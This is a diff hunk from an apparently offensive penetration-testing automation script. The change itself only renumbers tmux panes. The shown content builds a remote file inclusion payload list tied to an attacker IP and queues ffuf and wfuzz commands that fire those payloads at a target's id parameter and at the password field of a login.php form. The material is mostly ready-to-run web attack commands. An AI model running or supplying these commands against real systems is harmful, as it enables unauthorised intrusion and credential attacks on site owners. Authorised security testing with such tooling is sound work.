@@ -3397,12 +3397,12 @@ cd $folderProjectEngine
 python ./injectionGenerator.py $attackerIP injectionlist.txt
 mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
 cd $folderProjectWebAuthN
-tmux send-keys -t PT:7.3"# RFI injection automation (save burp file with name: burp.req)" Enter
-tmux send-keys -t PT:7.3 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
-tmux send-keys -t PT:7.4"# RFI injection automation (GET)" Enter
-tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
-tmux send-keys -t PT:7.5 "# RFI injection automation (POST)" Enter
-tmux send-keys -t PT:7.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+tmux send-keys -t PT:7.2"# RFI injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:7.2 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
+tmux send-keys -t PT:7.3"# RFI injection automation (GET)" Enter
+tmux send-keys -t PT:7.3 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
+tmux send-keys -t PT:7.4 "# RFI injection automation (POST)" Enter
+tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
 cd $folderProject
 
 
